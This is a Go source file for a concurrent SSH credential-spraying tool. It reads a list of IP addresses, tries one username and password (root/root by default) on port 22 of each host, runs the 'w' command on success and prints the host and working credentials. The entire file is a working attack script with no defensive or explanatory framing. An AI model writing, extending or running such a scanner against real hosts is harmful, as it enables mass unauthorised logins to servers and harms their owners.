package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/dynport/gossh"
)

var verbose *bool
var ips chan string

func check(err error, msg string) {
	if err != nil {
		//fmt.Println(msg)
		os.Exit(1)
	}
}

func trySSH(user, pass, host string, port int) bool {

	client := gossh.New(host, user)
	client.Port = port
	client.SetPassword(pass)
	defer client.Close()

	r, e := client.Execute("w")
	if e != nil {
		//fmt.Println(e.Error())

		if strings.Contains(e.Error(), "unable to authenticate") {
			if *verbose {
				fmt.Printf("[%s] [%s] [%s]\n", host, user, pass)
			}
			return false
		} else if strings.Contains(e.Error(), "ssh: handshake failed: EOF") {
			if *verbose {
				fmt.Printf("[%s] [%s] [%s] handshake failed\n", host, user, pass)
			}
			return false

		} else if strings.Contains(e.Error(), "process exited with") {
			if *verbose {
				fmt.Printf("[%s] [%s] [%s] Goooooood!!!! %s\n", host, user, pass, e.Error())
			}
			return true
		} else {
			fmt.Printf("%s not ssh\n", host)
			//panic(e)
		}

		if *verbose {
			fmt.Printf("[%s] [%s] [%s] %s\n", host, user, pass, e.Error())
		}
		return false
	}

	fmt.Printf("[%s:%d] [%s] [%s] Goooooood!!!!\n", host, port, user, pass)
	fmt.Printf(r.String())
	client.Close()
	os.Exit(1)
	return true
}

func loadWordlist(wordlist, retry string) {
	skip := true
	file, err := os.Open(wordlist)
	check(err, "Can't load the wordlist")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if retry == "" {
			ips <- scanner.Text()
		} else {
			ip := scanner.Text()
			if retry == ip {
				skip = false
			}
			if !skip {
				ips <- scanner.Text()
			}
		}		
	}
	ips <- "[1337]"
	close(ips)
	fmt.Println("Dictionary loaded.")
}

func main() {
	filename := flag.String("f", "", "IPs file")
	pwd := flag.String("p", "root", "password")
	user := flag.String("u", "root", "user name")
	goroutines := flag.Int("go", 2, "gorountines")
	retry := flag.String("r", "", "continue from ip")
	verbose = flag.Bool("v", false, "verbose mode")
	flag.Parse()

	if *filename == "" {
		fmt.Println("filename is mandatory -f or -help")
		os.Exit(1)
	}

	ips = make(chan string, 6)

	go loadWordlist(*filename, *retry)

	for i := 0; i < *goroutines; i++ {
		go func(g int, pass, login string) {
			for ip := range ips {
				if ip == "[1337]" {
					os.Exit(1)
				}
				trySSH(login, pass, ip, 22)
			}
		}(i, *pwd, *user)
	}

	var i int
	for {
		fmt.Scanf("%d", &i)
	}
}


